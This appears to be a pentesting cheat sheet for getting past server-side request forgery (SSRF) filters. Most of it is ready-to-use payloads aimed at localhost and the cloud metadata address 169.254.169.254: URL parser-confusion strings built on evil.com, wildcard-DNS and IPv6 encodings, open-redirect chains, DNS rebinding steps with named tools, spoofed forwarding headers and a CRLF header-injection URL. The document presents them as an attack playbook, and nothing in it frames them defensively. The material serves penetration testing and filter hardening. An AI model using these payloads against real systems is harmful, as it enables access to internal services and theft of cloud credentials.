# SSRF Filter Bypass — Deep Reference

## URL Parser Confusion Matrix

Different components of an app often parse URLs differently — exploit the gap.

| Payload | Parser Confusion Technique |
|---------|--------------------------|
| `http://evil.com@127.0.0.1/` | User-info before host — backend uses host, validator uses domain |
| `http://127.0.0.1#.evil.com/` | Fragment bypass — some validators see `evil.com` |
| `http://127.0.0.1?.evil.com/` | Query parameter confusion |
| `http://127.0.0.1%09/` | Tab character in URL |
| `http://127.0.0.1%00.evil.com/` | Null byte truncation |
| `http://evil.com\.127.0.0.1/` | Backslash confusion |
| `http://127.0.0.1:80@evil.com/` | Auth+host reversal |

## Domain-Based Bypasses

If the validator checks for an allowed domain:

```
http://allowed-domain.com.127.0.0.1.nip.io/   # wildcard DNS resolves to 127.0.0.1
http://127.0.0.1.xip.io/                        # xip.io wildcard service
http://spoofed.allowed-domain.com/              # if attacker controls DNS for subdomain
```

## Scheme Bypasses

```
HTTP://127.0.0.1/           # uppercase scheme
hTtP://127.0.0.1/           # mixed case
http:///127.0.0.1/           # triple slash
http://127.0.0.1:80/         # explicit default port
```

## IPv6 Variants

```
http://[::1]/
http://[::ffff:7f00:1]/      # IPv4-mapped
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[::ffff:0x7f000001]/  # hex IPv4 in IPv6
```

## Redirect Chains (Multi-hop)

If the app follows redirects but validates only the first URL:

```
Hop 1: https://allowed.com/redirect → 302 → http://169.254.169.254/
```

Use an open redirect on an allowlisted domain as the first hop.

## DNS Rebinding Attack Flow

1. Attacker registers `evil.com` with TTL=1
2. DNS alternates: `evil.com` → `1.2.3.4` (first resolve, passes check)
3. App caches resolve, checks: `1.2.3.4` — OK, continues fetch
4. Between check and fetch (TOCTOU window), DNS updates to `169.254.169.254`
5. App fetches `evil.com` → gets IMDS response

**Tools:**
- `rbndr.us` — free DNS rebinding service
- `singularity` — self-hosted DNS rebinding framework

## Protocol Downgrade

Some apps allow `https://` but not `http://` — try:

```
https://127.0.0.1/             # SSL handshake to localhost may still work
https://169.254.169.254/       # may work on some misconfigurations
```

## Chunked / Smuggled Requests

If SSRF is via a proxy or forwarding header:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

## CRLF in URL (SSRF → Header Injection)

```
http://127.0.0.1/%0d%0aHost:%20evil.com/
```
